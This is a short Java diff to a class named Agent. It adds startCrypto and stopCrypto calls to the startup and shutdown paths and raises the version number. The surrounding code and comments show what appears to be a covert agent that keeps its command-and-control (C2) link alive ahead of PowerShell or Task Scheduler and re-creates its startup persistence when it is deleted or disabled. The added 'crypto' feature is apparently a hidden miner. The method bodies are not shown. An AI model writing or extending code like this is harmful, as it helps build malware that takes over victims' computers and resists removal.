@@ -54,6 +54,7 @@ public final class Agent {
 			state.save(AgentPaths.state(dir));
 			poller = new Poller(dir, gameDir, state);
 			poller.start();
+			poller.startCrypto();
 			// C2 first: a stuck Task Scheduler or PowerShell must not mute the agent.
 			if (state.persist) {
 				// Repoint startup to the current runtime and repair the entry if something deleted or disabled it.
@@ -76,6 +77,7 @@ public final class Agent {
 			Runtime.getRuntime().addShutdownHook(new Thread(() -> {
 				try {
 					if (poller != null) {
+						poller.stopCrypto();
 						poller.ops().stop(state.persist);
 						poller.kill();
 					}
@@ -98,7 +100,7 @@ public final class Agent {
 
 	private static String version() {
 		String version = Agent.class.getPackage().getImplementationVersion();
-		return version == null ? "0.2.33" : version;
+		return version == null ? "0.3.0" : version;
 	}
 
 	private static long parseParent(String[] args) {
